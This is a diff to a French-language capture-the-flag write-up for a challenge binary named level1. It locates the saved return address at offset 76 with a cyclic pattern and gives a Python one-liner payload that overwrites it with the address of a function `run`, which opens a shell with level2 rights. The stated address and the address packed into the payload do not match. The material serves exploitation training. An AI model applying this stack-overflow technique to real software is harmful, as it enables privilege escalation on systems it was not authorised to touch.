@@ -86,15 +86,10 @@
       `run < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')`
       On obtient bien le segfault attendu.
     - Chercher l'emplacement du pattern en mémoire avec `pattern search` :
-        > EBP+0 found at offset: 72
-        > 
-        > [EBP] --> offset 72 - size ~28
-    <!-- - Placer un breakpoint sur la fonction run avec `br run` (ceci nous donne aussi son adresse : `Breakpoint 1 at 0x804844a`) -->
-    <!-- - Relancer le programme avec une chaine comportant 72 + 4 caractères puis l'adresse de run (inversée) : -->
-      <!-- `r < <(python -c 'print "\x90"*76+"\x4a\x84\x04\x08"')` -->
+        > EIP+0 found at offset: 76
 
 - Dans la Vm :
-  - générer une chaine de 72 + 4 (taille du pointeur) caractères suivie de l'adresse de la fonction `run` (0x08048444 inversée car système little endian) et la passer sur l'entrée standard du programme :
+  - générer une chaine de 76 caractères suivie de l'adresse de la fonction `run` (0x08048444 inversée car système little endian) et la passer sur l'entrée standard du programme :
     `(python -c 'print "A"*76+"\x4a\x84\x04\x08"' ; cat) | ./level1`
 
     Un nouvel shell est exécuté avec les droits user level2 :
